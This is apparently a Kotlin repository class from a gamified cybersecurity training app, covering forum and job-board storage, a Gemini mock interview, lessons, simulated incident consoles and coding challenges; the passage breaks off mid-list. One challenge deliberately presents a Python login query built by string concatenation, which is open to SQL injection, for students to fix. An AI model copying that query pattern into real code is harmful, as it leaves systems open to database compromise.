package com.example.data.repository

import com.example.data.api.GeminiApiClient
import com.example.data.api.GeminiRequest
import com.example.data.api.GeminiContent
import com.example.data.api.GeminiPart
import com.example.data.api.GeminiGenerationConfig
import com.example.data.api.InterviewResponse
import com.example.data.database.AcademyDao
import com.example.data.database.UserProgressEntity
import com.example.data.database.ForumPostEntity
import com.example.data.database.StudyReminderEntity
import com.example.data.database.StudyGroupEntity
import com.example.data.database.InterviewSessionEntity
import com.squareup.moshi.Moshi
import com.squareup.moshi.Types
import com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withContext
import java.util.Date
import com.example.BuildConfig

// --- UI Domain Models ---

data class Lesson(
    val id: String,
    val title: String,
    val description: String,
    val points: Int,
    val path: String, // "CompTIA Security+", "CISSP", "Networking"
    val content: String,
    val quizQuestion: String,
    val quizOptions: List<String>,
    val quizAnswerIndex: Int,
    val quizExplanation: String
)

data class Simulation(
    val id: String,
    val title: String,
    val description: String,
    val points: Int,
    val scenario: String,
    val targetSolution: String,
    val initialConsoleLogs: List<String>
)

data class CodingChallenge(
    val id: String,
    val title: String,
    val description: String,
    val language: String,
    val initialCode: String,
    val instructions: String,
    val multipleChoiceOptions: List<String>? = null,
    val answerIndex: Int? = null,
    val testCasesDescription: String,
    val points: Int = 50
)

data class JobListing(
    val id: String,
    val title: String,
    val company: String,
    val location: String,
    val type: String, // "Full-time", "Contract", "Remote"
    val salary: String,
    val recruiterName: String,
    val description: String,
    val requirements: List<String>
)

data class Reply(
    val author: String,
    val role: String,
    val content: String,
    val timestamp: Long
)

// --- Repository Implementation ---

class AcademyRepository(private val dao: AcademyDao) {

    private val moshi = Moshi.Builder().addLast(KotlinJsonAdapterFactory()).build()
    private val repliesAdapter = moshi.adapter<List<Reply>>(
        Types.newParameterizedType(List::class.java, Reply::class.java)
    )

    fun parseReplies(json: String): List<Reply> {
        return try {
            repliesAdapter.fromJson(json) ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    // Observables from Database
    val userProgress: Flow<UserProgressEntity?> = dao.getUserProgress()
    val forumPosts: Flow<List<ForumPostEntity>> = dao.getAllForumPosts()
    val studyReminders: Flow<List<StudyReminderEntity>> = dao.getAllReminders()
    val studyGroups: Flow<List<StudyGroupEntity>> = dao.getAllStudyGroups()
    val interviewSessions: Flow<List<InterviewSessionEntity>> = dao.getAllInterviewSessions()

    val jobListings: Flow<List<com.example.data.database.JobListingEntity>> = dao.getAllJobListingsFlow()
    val candidates: Flow<List<com.example.data.database.CandidateProfileEntity>> = dao.getAllCandidatesFlow()
    val currentUserCandidate: Flow<com.example.data.database.CandidateProfileEntity?> = dao.getCurrentUserCandidateFlow()
    val allJobApplications: Flow<List<com.example.data.database.JobApplicationEntity>> = dao.getAllJobApplicationsFlow()

    // Ensure database has default data (e.g. study groups, forum posts) on first init
    suspend fun populateDefaultsIfNeeded() = withContext(Dispatchers.IO) {
        val existingGroups = dao.getAllStudyGroups().first()
        if (existingGroups.isEmpty()) {
            val defaultGroups = listOf(
                StudyGroupEntity(name = "Security+ Study Circle", description = "For students preparing for CompTIA Security+ SY0-701.", certificationPath = "CompTIA Security+", memberCount = 18),
                StudyGroupEntity(name = "CISSP Elite Prep", description = "Strict study group focusing on all 8 domains of CISSP.", certificationPath = "CISSP", memberCount = 12),
                StudyGroupEntity(name = "Networking Basics", description = "Friendly room for beginners looking to conquer the OSI model.", certificationPath = "Networking", memberCount = 25)
            )
            for (group in defaultGroups) {
                dao.insertStudyGroup(group)
            }
        }

        val existingPosts = dao.getAllForumPosts().first()
        if (existingPosts.isEmpty()) {
            val defaultPosts = listOf(
                ForumPostEntity(
                    title = "How to approach CISSP Domain 3 (Security Engineering)?",
                    content = "Hey everyone! I'm currently stuck on cryptosystems and cryptographic models in Domain 3. Does anyone have a handy summary of the Bell-LaPadula vs Biba integrity models? I keep swapping them in my head.",
                    author = "thawfiks",
                    role = "Student",
                    timestamp = System.currentTimeMillis() - 7200000,
                    tag = "CISSP",
                    repliesJson = repliesAdapter.toJson(listOf(
                        Reply("Alice Johnson", "Expert", "Easiest way to remember is: Bell-LaPadula is about Confidentiality (No read up, No write down). Biba is about Integrity (No read down, No write up). Write them down on a flashcard with 'BLP = Conf' and 'Biba = Integrity'!", System.currentTimeMillis() - 3600000)
                    ))
                ),
                ForumPostEntity(
                    title = "Recommended Labs for Hands-On Security+ Practice",
                    content = "I'm passing the practice quizzes but I feel like I lack hands-on experience in networking. What tools should I run locally to gain solid skills before the SY0-701 exam?",
                    author = "Marcus Aurelius",
                    role = "Student",
                    timestamp = System.currentTimeMillis() - 14400000,
                    tag = "CompTIA Security+",
                    repliesJson = repliesAdapter.toJson(listOf(
                        Reply("John Mentor", "Mentor", "Start with Wireshark to inspect packets. Try filtering by 'http' or 'dns' to see exactly how requests transfer. Next, download Nmap and scan your own router interface to map out open ports. Keep up the great work!", System.currentTimeMillis() - 1080000)
                    ))
                )
            )
            for (post in defaultPosts) {
                dao.insertForumPost(post)
            }
        }

        // Initialize User Progress if empty
        val progress = dao.getUserProgressOnce()
        if (progress == null) {
            dao.saveUserProgress(UserProgressEntity(id = 1, xp = 0, level = 1))
        }

        // Initialize Job Listings default data
        val existingJobs = dao.getAllJobListingsFlow().first()
        if (existingJobs.isEmpty()) {
            val defaultJobs = listOf(
                com.example.data.database.JobListingEntity(
                    title = "Junior Security Analyst (SOC)",
                    company = "SecOps Technologies",
                    location = "Remote / New York",
                    type = "Full-time",
                    salary = "$75,000 - $90,000",
                    recruiterName = "Sarah Connor (Talent Specialist)",
                    description = "We are seeking a vigilant Junior Security Analyst to join our 24/7 Security Operations Center. You will monitor network telemetry, investigate suspicious alerts, and escalate active incidents.",
                    requirements = "CompTIA Security+, TCP/IP, Wireshark, Log Analysis",
                    timestamp = System.currentTimeMillis()
                ),
                com.example.data.database.JobListingEntity(
                    title = "Information Security Consultant",
                    company = "Apex GRC Partners",
                    location = "Hybrid (Chicago, IL)",
                    type = "Full-time",
                    salary = "$110,000 - $135,000",
                    recruiterName = "David Miller (Director of Recruitment)",
                    description = "Join our Governance, Risk, and Compliance (GRC) team to guide enterprise clients through risk mitigation, compliance audits (SOC2, ISO 27001), and secure architecture design.",
                    requirements = "CISSP, ISO 27001, Risk Management, Quantitative Auditing",
                    timestamp = System.currentTimeMillis() - 86400000
                ),
                com.example.data.database.JobListingEntity(
                    title = "Penetration Tester",
                    company = "RedTeam Labs",
                    location = "Remote",
                    type = "Contract",
                    salary = "$120k - $150k",
                    recruiterName = "Marcus Brody (Principal)",
                    description = "Assess the defensive posture of modern web apps, cloud systems, and internal corporate infrastructure using state-of-the-art offensive security strategies.",
                    requirements = "OSCP, Burp Suite, Python, Penetration Testing",
                    timestamp = System.currentTimeMillis() - 172800000
                )
            )
            for (job in defaultJobs) {
                dao.insertJobListing(job)
            }
        }

        // Initialize Candidate Profiles default data
        val existingCandidates = dao.getAllCandidatesFlow().first()
        if (existingCandidates.isEmpty()) {
            val defaultCandidates = listOf(
                com.example.data.database.CandidateProfileEntity(
                    name = "Alice Johnson",
                    title = "SOC Analyst",
                    skills = "Wireshark, Python, Nmap, Splunk, SIEM",
                    certifications = "CompTIA Security+, GCIH",
                    experienceYears = 3,
                    email = "alice@example.com",
                    avatarSeed = "alice"
                ),
                com.example.data.database.CandidateProfileEntity(
                    name = "Bob Smith",
                    title = "Penetration Tester",
                    skills = "Metasploit, Python, Burp Suite, Bash Scripting",
                    certifications = "CEH, OSCP",
                    experienceYears = 5,
                    email = "bob@example.com",
                    avatarSeed = "bob"
                ),
                com.example.data.database.CandidateProfileEntity(
                    name = "Charlie Brown",
                    title = "GRC Consultant",
                    skills = "Risk Management, NIST CSF, ISO 27001 Auditing",
                    certifications = "CISA, CISSP",
                    experienceYears = 8,
                    email = "charlie@example.com",
                    avatarSeed = "charlie"
                )
            )
            for (candidate in defaultCandidates) {
                dao.insertCandidate(candidate)
            }
        }
    }

    // --- Job Board DB Operations ---

    suspend fun postJobListing(
        title: String,
        company: String,
        location: String,
        type: String,
        salary: String,
        recruiterName: String,
        description: String,
        requirements: String
    ) = withContext(Dispatchers.IO) {
        dao.insertJobListing(
            com.example.data.database.JobListingEntity(
                title = title,
                company = company,
                location = location,
                type = type,
                salary = salary,
                recruiterName = recruiterName,
                description = description,
                requirements = requirements,
                timestamp = System.currentTimeMillis()
            )
        )
    }

    suspend fun updateCandidateProfile(
        name: String,
        title: String,
        skills: String,
        certifications: String,
        experienceYears: Int,
        email: String,
        avatarSeed: String
    ) = withContext(Dispatchers.IO) {
        val existing = dao.getCurrentUserCandidateOnce()
        val candidate = com.example.data.database.CandidateProfileEntity(
            id = existing?.id ?: 0,
            name = name,
            title = title,
            skills = skills,
            certifications = certifications,
            experienceYears = experienceYears,
            email = email,
            avatarSeed = avatarSeed,
            isCurrentUser = true
        )
        dao.insertCandidate(candidate)
    }

    suspend fun applyForJob(
        jobId: Int,
        applicantName: String,
        applicantEmail: String,
        applicantSkills: String,
        applicantCertifications: String
    ) = withContext(Dispatchers.IO) {
        dao.insertJobApplication(
            com.example.data.database.JobApplicationEntity(
                jobId = jobId,
                applicantName = applicantName,
                applicantEmail = applicantEmail,
                applicantSkills = applicantSkills,
                applicantCertifications = applicantCertifications,
                timestamp = System.currentTimeMillis()
            )
        )
    }

    fun getApplicationsForJob(jobId: Int): Flow<List<com.example.data.database.JobApplicationEntity>> {
        return dao.getApplicationsForJobFlow(jobId)
    }

    // --- Gamified Progress Actions ---

    suspend fun addXp(amount: Int) = withContext(Dispatchers.IO) {
        val current = dao.getUserProgressOnce() ?: UserProgressEntity()
        val newXp = current.xp + amount
        // Simple levelling formula: 1 level per 250 XP
        val newLevel = (newXp / 250) + 1
        dao.saveUserProgress(
            current.copy(
                xp = newXp,
                level = if (newLevel > current.level) newLevel else current.level
            )
        )
    }

    suspend fun completeLesson(lessonId: String, points: Int) = withContext(Dispatchers.IO) {
        val current = dao.getUserProgressOnce() ?: UserProgressEntity()
        val completed = current.completedLessonIds.split(",").filter { it.isNotEmpty() }.toMutableSet()
        if (completed.add(lessonId)) {
            val newCompleted = completed.joinToString(",")
            val newXp = current.xp + points
            val newLevel = (newXp / 250) + 1
            dao.saveUserProgress(
                current.copy(
                    xp = newXp,
                    level = if (newLevel > current.level) newLevel else current.level,
                    completedLessonIds = newCompleted
                )
            )
        }
    }

    suspend fun completeChallenge(challengeId: String, points: Int) = withContext(Dispatchers.IO) {
        val current = dao.getUserProgressOnce() ?: UserProgressEntity()
        val completed = current.completedChallengeIds.split(",").filter { it.isNotEmpty() }.toMutableSet()
        if (completed.add(challengeId)) {
            val newCompleted = completed.joinToString(",")
            val newXp = current.xp + points
            val newLevel = (newXp / 250) + 1
            dao.saveUserProgress(
                current.copy(
                    xp = newXp,
                    level = if (newLevel > current.level) newLevel else current.level,
                    completedChallengeIds = newCompleted
                )
            )
        }
    }

    suspend fun completeSimulation(simulationId: String, points: Int) = withContext(Dispatchers.IO) {
        val current = dao.getUserProgressOnce() ?: UserProgressEntity()
        val completed = current.completedSimulationIds.split(",").filter { it.isNotEmpty() }.toMutableSet()
        if (completed.add(simulationId)) {
            val newCompleted = completed.joinToString(",")
            val newXp = current.xp + points
            val newLevel = (newXp / 250) + 1
            dao.saveUserProgress(
                current.copy(
                    xp = newXp,
                    level = if (newLevel > current.level) newLevel else current.level,
                    completedSimulationIds = newCompleted
                )
            )
        }
    }

    // --- Study Reminders & Groups ---

    suspend fun addReminder(title: String, timeText: String, daysText: String) = withContext(Dispatchers.IO) {
        dao.insertReminder(StudyReminderEntity(title = title, timeText = timeText, daysText = daysText))
    }

    suspend fun deleteReminder(id: Int) = withContext(Dispatchers.IO) {
        dao.deleteReminderById(id)
    }

    suspend fun toggleStudyGroupJoin(groupId: Int, currentlyJoined: Boolean) = withContext(Dispatchers.IO) {
        val delta = if (currentlyJoined) -1 else 1
        dao.updateGroupJoinState(groupId, !currentlyJoined, delta)
    }

    // --- Forum Actions ---

    suspend fun createForumPost(title: String, content: String, author: String, role: String, tag: String) = withContext(Dispatchers.IO) {
        val post = ForumPostEntity(
            title = title,
            content = content,
            author = author,
            role = role,
            timestamp = System.currentTimeMillis(),
            tag = tag,
            repliesJson = "[]"
        )
        dao.insertForumPost(post)
        // Gain 10 XP for community participation!
        addXp(10)
    }

    suspend fun addPostReply(postId: Int, author: String, role: String, content: String) = withContext(Dispatchers.IO) {
        val post = dao.getForumPostById(postId) ?: return@withContext
        val currentReplies = repliesAdapter.fromJson(post.repliesJson)?.toMutableList() ?: mutableListOf()
        currentReplies.add(Reply(author, role, content, System.currentTimeMillis()))
        dao.insertForumPost(post.copy(repliesJson = repliesAdapter.toJson(currentReplies)))
        // Gain 5 XP for collaborative discussion
        addXp(5)
    }

    // --- Gemini Mock Interview API ---

    suspend fun conductInterviewStep(
        interviewType: String,
        transcript: List<GeminiContent>,
        userAnswer: String
    ): InterviewResponse = withContext(Dispatchers.IO) {
        val apiKey = BuildConfig.GEMINI_API_KEY
        if (apiKey.isEmpty() || apiKey == "MY_GEMINI_API_KEY") {
            // Offline/No-key fallback simulation
            return@withContext InterviewResponse(
                feedback = "Demo/Fallback Mode (API Key not set): Excellent explanation of cybersecurity principles! You accurately covered risk mitigation and compliance standards. Keep detailing specific protocol names.",
                score = 88,
                nextQuestion = if (interviewType == "Technical") {
                    "Can you explain the main security differences between hashing, symmetric encryption, and asymmetric encryption?"
                } else {
                    "Describe a time you had a technical disagreement with a peer regarding a security patch. How did you resolve it?"
                }
            )
        }

        // Construct conversational history
        val promptText = if (transcript.isEmpty()) {
            "Start the mock cybersecurity interview. Ask the first introductory question for a $interviewType cybersecurity role."
        } else {
            "The user's answer is: \"$userAnswer\". Analyze this answer, give detailed feedback and scoring, and then ask the next technical/behavioral interview question."
        }

        val systemInstructionText = """
            You are a rigorous, highly-experienced Cybersecurity Technical Interviewer conducting a mock interview for a $interviewType Cybersecurity Specialist role.
            You must evaluate each response accurately based on real-world industry practices (NIST, OWASP, ISO 27001).
            You MUST return a JSON object containing exactly these fields:
            {
               "feedback": "Your detailed constructive feedback regarding their previous answer. Critique what they did well and point out missing technical protocols or concepts.",
               "score": 85, // Integer from 0 to 100 assessing the previous answer quality. Give 0 if this is the start of the interview with no previous answer.
               "nextQuestion": "The next high-quality interview question you wish to pose"
            }
            Do not include any text, headers, or markdown formatting outside this JSON structure.
        """.trimIndent()

        val contentsList = transcript.toMutableList()
        contentsList.add(GeminiContent(role = "user", parts = listOf(GeminiPart(text = promptText))))

        val request = GeminiRequest(
            contents = contentsList,
            generationConfig = GeminiGenerationConfig(
                temperature = 0.7,
                responseMimeType = "application/json"
            ),
            systemInstruction = GeminiContent(parts = listOf(GeminiPart(text = systemInstructionText)))
        )

        try {
            val response = GeminiApiClient.service.generateContent(apiKey, request)
            val textOutput = response.candidates?.firstOrNull()?.content?.parts?.firstOrNull()?.text
                ?: throw Exception("No response text from Gemini")
            GeminiApiClient.parseInterviewResponse(textOutput)
        } catch (e: Exception) {
            e.printStackTrace()
            InterviewResponse(
                feedback = "Network error while connecting to secure evaluator. However, reviewing standard protocols (HTTPS, firewalls) is always highly recommended.",
                score = 70,
                nextQuestion = "How do you securely configure a firewall to block DDoS traffic while allowing legitimate APIs?"
            )
        }
    }

    suspend fun saveInterviewResult(type: String, score: Int, feedback: String, transcriptJson: String) = withContext(Dispatchers.IO) {
        val session = InterviewSessionEntity(
            type = type,
            timestamp = System.currentTimeMillis(),
            feedback = feedback,
            score = score,
            transcriptJson = transcriptJson
        )
        dao.insertInterviewSession(session)
        // Add completion XP!
        addXp(50)
    }

    // --- Static Learning & Mock Datasets ---

    val certificationPaths = listOf("CompTIA Security+", "CISSP", "Networking")

    val lessonsList = listOf(
        // CompTIA Security+ Lessons
        Lesson(
            id = "sec_1",
            title = "Network Attacks & Protocols",
            description = "Explore foundational attacks: ARP poisoning, DNS hijacking, and how standard firewalls prevent them.",
            points = 50,
            path = "CompTIA Security+",
            content = """
                In modern security, network protocols must be understood inside out. Attackers exploit missing verification steps in standard legacy protocols.
                
                1. ARP Poisoning: Address Resolution Protocol maps IP addresses to MAC addresses on a local network. Since ARP is stateless and lacks authentication, an attacker can broadcast malicious ARP replies, associating their own MAC address with a target Gateway IP (Man-in-the-Middle attack). Defense involves configuring Dynamic ARP Inspection (DAI) on managed switches.
                
                2. DNS Hijacking: Domain Name System converts human-readable domain names into IP addresses. Attackers can hijack DNS requests at the local machine, router, or registrar level to redirect users to malicious landing pages. Implement DNSSEC (Domain Name System Security Extensions) to add cryptographic signatures to DNS records for validation.
                
                3. Firewalls: Traditional packet-filtering firewalls filter traffic purely by IP address, port, and protocol. Modern Next-Generation Firewalls (NGFW) operate up to the Application Layer (Layer 7), performing deep packet inspection, TLS decryption, and real-time threat intelligence matching.
            """.trimIndent(),
            quizQuestion = "Which protocol extension provides cryptographic authentication to domain name mapping?",
            quizOptions = listOf("DHCP Option 82", "DNSSEC", "S/MIME", "HTTPS / SSL"),
            quizAnswerIndex = 1,
            quizExplanation = "DNSSEC (Domain Name System Security Extensions) adds digital signatures to DNS lookups to verify authenticity and prevent spoofing or hijacking."
        ),
        Lesson(
            id = "sec_2",
            title = "Symmetric vs Asymmetric Cryptography",
            description = "Dive into symmetric and asymmetric algorithms, cryptographic key exchanges, and the HTTPS handshake.",
            points = 50,
            path = "CompTIA Security+",
            content = """
                Cryptography secures data in transit and at rest using two core paradigms:
                
                1. Symmetric Cryptography: The same single shared secret key is used for both encryption and decryption. Symmetric algorithms are incredibly fast and computationally lightweight.
                   - Standard: AES (Advanced Encryption Standard). AES-256 is the gold standard used by government agencies and military installations.
                   - Drawback: Secure key exchange is a major challenge. How do both parties exchange the key safely?
                
                2. Asymmetric Cryptography: Uses a mathematically linked key pair: a Public Key (distributed openly) and a Private Key (kept strictly confidential).
                   - Purpose: Solving key exchange (Diffie-Hellman) and enabling digital signatures.
                   - Standard: RSA, ECC (Elliptic Curve Cryptography). ECC provides equivalent security to RSA with significantly smaller key sizes.
                
                3. Hybrid System (HTTPS Handshake):
                   - To load an encrypted web page, your browser uses Asymmetric cryptography (ECC/RSA) to safely negotiate and establish a temporary, unique Symmetric session key. Once negotiated, all ongoing browser traffic uses Symmetric encryption (AES) for ultra-fast, secure transit.
            """.trimIndent(),
            quizQuestion = "In the HTTPS handshake, what type of cryptography is used to secure the actual ongoing body payload transmission?",
            quizOptions = listOf("Asymmetric Cryptography (RSA)", "Symmetric Cryptography (AES)", "Hashing (SHA-256)", "Diffie-Hellman Only"),
            quizAnswerIndex = 1,
            quizExplanation = "The handshake uses asymmetric cryptography to securely establish a key, but the continuous, heavy-lifting ongoing payload transmission is encrypted using symmetric cryptography (AES) due to speed."
        ),
        Lesson(
            id = "sec_3",
            title = "Social Engineering & Phishing Vector Analysis",
            description = "Learn how malicious actors exploit the human element via spear phishing, tailgating, and watering holes.",
            points = 40,
            path = "CompTIA Security+",
            content = """
                No firewall or encryption can protect a system if a user hands over their administrator credentials willingly. Social engineering targets human psychology: trust, urgency, fear, or authority.
                
                1. Spear Phishing: Highly targeted email attacks designed for a specific individual, organization, or executive (called Whaling). Attackers spend weeks researching social media profile details of target individuals to construct highly believable vectors.
                
                2. Tailgating / Piggybacking: Physical security breaches where an unauthorized individual closely follows an authorized employee through a secure gate or badge-only office door. Secure turnstiles and rigorous security culture are primary defenses.
                
                3. Watering Hole Attacks: An attacker targets a specific community or industry group by identifying web portals they frequently visit (e.g., local industry forum). The attacker compromises that specific site, injecting malware to infect community members when they visit standard resources.
            """.trimIndent(),
            quizQuestion = "What physical security defense is specifically designed to stop unauthorized personnel from tailgating behind employees?",
            quizOptions = listOf("Biometric badge readers", "Mantraps or turnstile barriers", "Next-Gen Firewall rules", "RFID credentials"),
            quizAnswerIndex = 1,
            quizExplanation = "Mantraps (dual-door interlocking portals) or security-guarded turnstiles physically limit entry to one validated person at a time, preventing physical tailgating."
        ),
        Lesson(
            id = "sec_4",
            title = "Identity & Access Management (IAM)",
            description = "Master authentications, Role-Based Access Control, SAML, and single sign-on technologies.",
            points = 40,
            path = "CompTIA Security+",
            content = """
                Authentication proves who you are, whereas Authorization defines what you are allowed to access.
                
                1. Role-Based Access Control (RBAC): Access permissions are assigned strictly to defined roles (e.g. Finance Admin, IT Helper), not individual users. This simplifies user access administration.
                
                2. Attribute-Based Access Control (ABAC): Dynamic access decisions based on variables: user role, department, local time, login IP address, and system health. Extremely granular.
                
                3. Single Sign-On (SSO):
                   - SAML (Security Assertion Markup Language): XML-based standard used for corporate web SSO, transmitting authentication token assertions between Identity Providers (IdP) and Service Providers (SP).
                   - OAuth 2.0 / OIDC (OpenID Connect): Modern JSON-based protocol standard for authorization (OAuth) and identity (OIDC) commonly used on consumer websites (e.g., 'Log in with Google').
            """.trimIndent(),
            quizQuestion = "Which IAM model permits access decisions based on user department, physical location, and current local time?",
            quizOptions = listOf("Role-Based Access Control (RBAC)", "Mandatory Access Control (MAC)", "Attribute-Based Access Control (ABAC)", "Discretionary Access Control (DAC)"),
            quizAnswerIndex = 2,
            quizExplanation = "ABAC (Attribute-Based Access Control) evaluates multiple dynamic variables, such as user characteristics, environmental context (time, location), and system attributes, to authorize access."
        ),

        // CISSP Lessons
        Lesson(
            id = "cissp_1",
            title = "Risk Management Framework & GRC",
            description = "Master professional risk metrics: SLE, ARO, ALE, and corporate risk response methodologies.",
            points = 60,
            path = "CISSP",
            content = """
                Risk is the probability of a threat agent exploiting a vulnerability to cause loss to an asset. Cybersecurity leaders must quantify risk to justify budget requests.
                
                1. Quantitative Risk Formulas:
                   - Single Loss Expectancy (SLE): Asset Value ($) × Exposure Factor (EF, %). Representing the cost of a single incident.
                   - Annualized Rate of Occurrence (ARO): How many times the security threat is estimated to occur per year.
                   - Annualized Loss Expectancy (ALE): SLE × ARO. This tells you the total annual cost of the risk.
                
                Example: If a database server is worth $100,000, and a leak has an EF of 50%, the SLE is $50,000. If the leak is expected once every 2 years (ARO = 0.5), the ALE is $25,000. Any security control costing more than $25,000 annually is not financially sound!
                
                2. Risk Strategies:
                   - Mitigation: Apply security patches, multi-factor authentication, or monitoring.
                   - Transfer: Buy cybersecurity insurance or contract a managed service.
                   - Avoidance: Terminate the risky project or service altogether.
                   - Acceptance: Acknowledge the risk cost as a normal cost of doing business when mitigation costs exceed benefits.
            """.trimIndent(),
            quizQuestion = "If a factory worth $2,000,000 has a fire exposure risk of 20% (EF = 0.2), and a major fire is estimated to occur once every 10 years (ARO = 0.1), what is the Annualized Loss Expectancy (ALE)?",
            quizOptions = listOf("$400,000", "$40,000", "$4,000", "$200,000"),
            quizAnswerIndex = 1,
            quizExplanation = "SLE = $2,000,000 * 0.2 = $400,000. ALE = SLE * ARO = $400,000 * 0.1 = $40,000."
        ),
        Lesson(
            id = "cissp_2",
            title = "Security Engineering & Models",
            description = "Explore state machine security models: Bell-LaPadula (Confidentiality) and Biba (Integrity).",
            points = 60,
            path = "CISSP",
            content = """
                Theoretical security models dictate how operating systems and databases partition user access to maintain absolute system integrity or privacy.
                
                1. Bell-LaPadula Model: Developed for the military to prevent unauthorized disclosures. Focuses on CONFIDENTIALITY.
                   - Simple Security Property: 'No Read Up' (a user cannot read files above their clearance level).
                   - * (Star) Property: 'No Write Down' (an administrator with secret clearance cannot write information down to an unclassified folder, which prevents leaks).
                
                2. Biba Integrity Model: Focuses on system data INTEGRITY, preventing modification of critical files by low-level entities.
                   - Simple Integrity Axiom: 'No Read Down' (prevents corruption by reading unreliable low-level information).
                   - * (Star) Integrity Axiom: 'No Write Up' (prevents a low-level subject from writing to or modifying high-level trusted files).
                
                Remember: Bell-LaPadula = Keep secrets safe (Confidentiality). Biba = Keep data clean (Integrity).
            """.trimIndent(),
            quizQuestion = "Which axiom or property in the Biba Integrity Model specifically prevents a standard system user from writing data to highly trusted system core configurations?",
            quizOptions = listOf("Simple Security Property", "* (Star) Property", "* (Star) Integrity Axiom", "Simple Integrity Axiom"),
            quizAnswerIndex = 2,
            quizExplanation = "The * (Star) Integrity Axiom states 'No Write Up' - a subject cannot write to or modify objects of higher integrity levels, protecting crucial system configurations."
        ),

        // Networking Basics Lessons
        Lesson(
            id = "net_1",
            title = "The OSI 7-Layer Model",
            description = "Learn the theoretical model of networking: physical wires up to the software application layer.",
            points = 40,
            path = "Networking",
            content = """
                The Open Systems Interconnection (OSI) model standardizes network communication into 7 logical layers:
                
                1. Physical Layer (L1): Raw electrical, optical, or radio signal transmissions (cables, hubs, Wi-Fi antennas).
                2. Data Link Layer (L2): Local hardware addressing via MAC addresses, Ethernet frames, and switches.
                3. Network Layer (L3): Logical network path routing, IP packets, routers, and IP addressing.
                4. Transport Layer (L4): End-to-end reliability and packet segment assembly (TCP/UDP, source/destination ports).
                5. Session Layer (L5): Managing continuous sessions/dialogs between applications (NetBIOS, RPC).
                6. Presentation Layer (L6): Translation, formatting, and standard data encryption (MIME, SSL, TLS).
                7. Application Layer (L7): User-facing software interfaces (HTTP, DNS, SMTP, FTP).
                
                Encapsulation: As your email travels down, each layer wraps the payload in header data, adding ports, IPs, MACs, and finally transmitting physical bits.
            """.trimIndent(),
            quizQuestion = "At which layer of the OSI model does logical IP routing and packet path selection occur?",
            quizOptions = listOf("Layer 2 (Data Link)", "Layer 3 (Network)", "Layer 4 (Transport)", "Layer 7 (Application)"),
            quizAnswerIndex = 1,
            quizExplanation = "Layer 3 (Network) handles logical routing, path determinations, and IP packet transmission."
        ),
        Lesson(
            id = "net_2",
            title = "TCP/IP Protocol Suite",
            description = "Study the TCP 3-way handshake, ports, and differences between TCP and UDP.",
            points = 40,
            path = "Networking",
            content = """
                The TCP/IP suite is the real-world operational backbone of the Internet.
                
                1. TCP (Transmission Control Protocol): Connection-oriented, offering guaranteed packet delivery, flow control, and error correction.
                   - The 3-way Handshake:
                     1. Client sends SYN (Synchronize)
                     2. Server replies SYN-ACK (Synchronize-Acknowledge)
                     3. Client replies ACK (Acknowledge)
                     The secure connection is now established!
                
                2. UDP (User Datagram Protocol): Connectionless, fire-and-forget protocol with no delivery guarantees. It has no handshake, making it incredibly fast. Ideal for real-time video streaming, DNS lookups, or multiplayer gaming.
                
                3. Port Bindings: Applications listen on designated ports. Common ones include HTTP (80), HTTPS (443), SSH (22), DNS (53), and FTP (21).
            """.trimIndent(),
            quizQuestion = "What is the sequence of flags sent during the TCP connection initialization handshake?",
            quizOptions = listOf("SYN -> ACK -> SYN-ACK", "SYN -> SYN-ACK -> ACK", "FIN -> ACK -> FIN-ACK", "RST -> SYN -> ACK"),
            quizAnswerIndex = 1,
            quizExplanation = "A standard TCP handshake is always: SYN from client, SYN-ACK from server, followed by ACK from client."
        )
    )

    val simulationsList = listOf(
        Simulation(
            id = "sim_ddos",
            title = "DDoS Cyber Defense",
            description = "Mitigate a live Distributed Denial of Service flood on an API gateway by identifying and blocking malicious IP logs.",
            points = 60,
            scenario = "A massive flood of traffic is targeting our web server. Run `/status` to view live connections. Analyze the output: one rogue IP address is sending hundreds of requests per second. Use the command `/block <IP>` in the terminal to mitigate the threat and stabilize the system before server capacity reaches 100%.",
            targetSolution = "/block 192.168.4.150",
            initialConsoleLogs = listOf(
                "SYSTEM: Firewall initialized...",
                "SERVER: Port 443 active.",
                "WARNING: Rapid increase in incoming HTTP GET requests detected!",
                "CONN_LOG: 10.0.0.45 -> GET /index.html (200 OK)",
                "CONN_LOG: 192.168.4.150 -> GET /api/v1/auth (200 OK)",
                "CONN_LOG: 192.168.4.150 -> GET /api/v1/auth (200 OK)",
                "CONN_LOG: 192.168.4.150 -> GET /api/v1/auth (200 OK)",
                "CONN_LOG: 10.0.2.14 -> GET /css/style.css (200 OK)",
                "CONN_LOG: 192.168.4.150 -> GET /api/v1/auth (200 OK)",
                "CONN_LOG: 192.168.4.150 -> GET /api/v1/auth (200 OK)",
                "CONN_LOG: 192.168.4.150 -> GET /api/v1/auth (200 OK)",
                "CONN_LOG: 172.16.50.2 -> GET /assets/logo.png (200 OK)",
                "SYSTEM_ALERT: CPU load rising rapidly: 78%!",
                "Type /status to inspect logs, and use /block <IP> to isolate the attacker."
            )
        ),
        Simulation(
            id = "sim_ransomware",
            title = "Ransomware Containment",
            description = "Identify and terminate an encrypting process before standard server files are encrypted.",
            points = 60,
            scenario = "Ransomware has bypassed the perimeter security! Files in `/shared/` are being rapidly renamed to `.locked`. Use the command `/ps` to list active running system processes, locate the PID of the unauthorized encryption executable, and terminate it using the command `/kill <PID>`.",
            targetSolution = "/kill 4982",
            initialConsoleLogs = listOf(
                "ALERT: Directory change detected in /shared/docs/",
                "ALERT: contract_final.pdf -> contract_final.pdf.locked",
                "ALERT: marketing_strategy.xlsx -> marketing_strategy.xlsx.locked",
                "SYSTEM: Active encryption of user assets detected!",
                "ALERT: payroll_july.csv -> payroll_july.csv.locked",
                "SERVER: Process monitoring enabled.",
                "Type /ps to scan the active process tree and discover the malicious script. Kill it with /kill <PID>!"
            )
        )
    )

    val codingChallengesList = listOf(
        CodingChallenge(
            id = "code_sql",
            title = "Sanitize SQL Input",
            description = "An API login query is vulnerable to SQL Injection due to string concatenation.",
            language = "Python",
            initialCode = """
# Vulnerable code:
def login_user(db, username, password):
    cursor = db.cursor()
    # ATTENTION: Concatenating input directly into SQL is dangerous!
    query = "SELECT * FROM users WHERE username = '" + username + "' AND pass = '" + password + "'"
    cursor.execute(query)
    return cursor.fetchone()
            """.trimIndent(),
            instructions = "Select the correct secure prepared statement syntax below that uses parameterized queries instead of direct string concatenation.",
            multipleChoiceOptions = listOf(
                "query = f\"SELECT * FROM users WHERE username = {username} AND pass = {password}\"",
